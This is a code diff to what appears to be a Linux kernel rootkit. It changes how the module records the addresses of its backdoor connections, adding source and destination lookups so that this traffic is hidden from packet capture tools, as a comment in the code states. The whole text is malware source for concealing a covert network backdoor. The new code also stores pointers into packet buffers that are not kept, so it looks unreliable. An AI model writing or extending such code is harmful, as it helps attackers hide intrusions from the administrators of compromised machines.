@@ -23,7 +23,8 @@
 
 static LIST_HEAD(iph_node);
 struct iph_node_t {
-    __be32 addr;
+    struct iphdr *iph;
+    struct tcphdr *tcph;
     struct list_head list;
 };
 
@@ -363,12 +364,13 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select) {
     return ret;
 }
 
-static int _bd_add_new_iph(__be32 addr) {
+static int _bd_add_new_iph(struct iphdr *iph, struct tcphdr *tcph) {
     struct iph_node_t *ip = kcalloc(1,
             sizeof(struct iph_node_t) , GFP_KERNEL);
     if (!ip) goto error;
 
-    ip->addr = addr;
+    ip->iph = iph;
+    ip->tcph = tcph;
     list_add_tail(&ip->list, &iph_node);
     return 0;
 error:
@@ -376,10 +378,20 @@ error:
     return -ENOMEM;
 }
 
-bool kv_bd_search_iph(__be32 addr) {
+bool kv_bd_search_iph_source(__be32 saddr) {
     struct iph_node_t *node, *node_safe;
     list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
-        if (node->addr == addr) {
+        if (node->iph->saddr == saddr) {
+            return true;
+        }
+    }
+    return false;
+}
+
+bool kv_bd_search_iph_dest(__be32 daddr) {
+    struct iph_node_t *node, *node_safe;
+    list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
+        if (node->iph->daddr == daddr) {
             return true;
         }
     }
@@ -389,6 +401,11 @@ bool kv_bd_search_iph(__be32 addr) {
 void _bd_cleanup(void) {
     struct iph_node_t *node, *node_safe;
     list_for_each_entry_safe(node, node_safe, &iph_node, list) {
+        char sip[INET_ADDRSTRLEN+1] = {0};
+        char dip[INET_ADDRSTRLEN+1] = {0};
+        snprintf(sip, INET_ADDRSTRLEN, "%pI4", &node->iph->saddr);
+        snprintf(dip, INET_ADDRSTRLEN, "%pI4", &node->iph->daddr);
+        prinfo("Cleaning: src:'%s' dst:'%s'\n", sip, dip);
         list_del(&node->list);
         kfree(node);
         node = NULL;
@@ -484,8 +501,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
                 _put_fifo(kf);
 
                 /* Make sure we won't show up in libcap */
-                _bd_add_new_iph(iph->saddr);
-                _bd_add_new_iph(iph->daddr);
+                _bd_add_new_iph(iph, tcph);
 
                 user = (struct nf_priv*)priv;
                 wake_up_process(user->task);
